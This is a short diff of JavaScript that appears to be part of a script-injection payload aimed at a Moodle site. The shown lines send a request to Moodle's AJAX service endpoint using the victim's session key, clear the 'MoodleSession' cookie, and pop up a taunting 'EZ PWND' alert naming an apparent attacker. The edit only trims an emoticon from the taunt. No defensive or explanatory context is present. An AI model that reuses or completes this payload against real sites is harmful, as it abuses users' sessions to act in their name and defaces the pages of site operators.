@@ -40,5 +40,5 @@ fetch('/lib/ajax/service.php?sesskey='+s,{
     document.cookie='MoodleSession=;path=/;';
 })
 .finally(() => {
-    alert("BTW EZ PWND BY NZRXHX ;)");
+    alert("BTW EZ PWND BY NZRXHX");
 });
